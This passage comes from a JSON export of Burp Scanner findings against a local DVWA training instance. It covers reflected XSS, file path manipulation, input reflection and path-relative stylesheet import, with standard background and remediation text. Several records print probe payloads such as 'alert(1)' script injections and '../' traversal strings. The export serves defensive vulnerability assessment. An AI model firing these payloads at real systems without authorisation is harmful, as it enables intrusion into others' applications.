        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/22.html\">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/23.html\">CWE-23: Relative Path Traversal</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/35.html\">CWE-35: Path Traversal: '.../...//'</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/36.html\">CWE-36: Absolute Path Traversal</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/126.html\">CAPEC-126: Path Traversal</a></li>\\n</ul>",
        "issue__issueDetail": "The <b>security</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./bnl/../low</b> was submitted in the security parameter. This returned the same content as the base request. The payload <b>.../low</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "18": {
        "\ufeffissue__serialNumber": "2.82005E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [security parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>c9lku&lt;script&gt;alert(1)&lt;/script&gt;wovul</b> was submitted in the security parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "19": {
        "\ufeffissue__serialNumber": "3.38251E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [security parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "20": {
        "\ufeffissue__serialNumber": "1.91371E+18",
        "issue__type": "1051392",
        "issue__name": "File path manipulation",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [id parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>File path manipulation vulnerabilities arise when user-controllable data is placed into a file or URL path that is used on the server to access local resources, which may be within or outside the web root. If vulnerable, an attacker can modify the file path to access different resources, which may contain sensitive information. Even where an attack is constrained within the web root, it is often possible to retrieve items that are normally protected from direct access, such as application configuration files, the source code for server-executable scripts, or files with extensions that the web server is not configured to serve directly.</p>",
        "issue__remediationBackground": "<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be placed into file or URL paths in order to access local resources on the server. This can normally be achieved by referencing known files via an index number rather than their name.</p>\\n<p>If it is considered unavoidable to place user data into file or URL paths, the data should be strictly validated against a whitelist of accepted values. Note that when accessing resources within the web root, simply blocking input containing file path traversal sequences (such as dot-dot-slash) is not always sufficient to prevent retrieval of sensitive information, because some protected items may be accessible at the original path without using any traversal sequences. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/file-path-traversal\">Web Security Academy: Directory traversal</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/22.html\">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/23.html\">CWE-23: Relative Path Traversal</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/35.html\">CWE-35: Path Traversal: '.../...//'</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/36.html\">CWE-36: Absolute Path Traversal</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/126.html\">CAPEC-126: Path Traversal</a></li>\\n</ul>",
        "issue__issueDetail": "The <b>id</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./muc/../brute</b> was submitted in the id parameter. This returned the same content as the base request. The payload <b>.../brute</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "21": {
        "\ufeffissue__serialNumber": "4.55757E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/upload/",
        "issue__location": "/dvwa/vulnerabilities/upload/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "22": {
        "\ufeffissue__serialNumber": "1.90115E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [id parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>id</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>ytnkd&lt;script&gt;alert(1)&lt;/script&gt;axdl3</b> was submitted in the id parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
